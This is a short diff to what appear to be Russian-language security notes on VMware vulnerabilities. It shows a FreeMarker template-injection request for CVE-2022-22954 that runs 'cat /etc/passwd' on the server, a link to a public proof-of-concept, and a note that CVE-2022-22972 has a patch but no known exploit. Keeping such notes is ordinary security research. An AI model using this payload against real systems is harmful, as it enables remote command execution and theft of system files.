@@ -5,3 +5,9 @@
 ```
 /catalog-portal/ui/oauth/verify?error=&deviceUdid=${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}
 ```
+
+PoC: [https://github.com/sherlocksecurity/VMware-CVE-2022-22954](https://github.com/sherlocksecurity/VMware-CVE-2022-22954)
+
+## CVE-2022-22972: Auth Bypass
+
+На Linux серверах. Эксплоита нет, патч вышел, скачать не могу: [https://kb.vmware.com/s/article/88438](https://kb.vmware.com/s/article/88438)
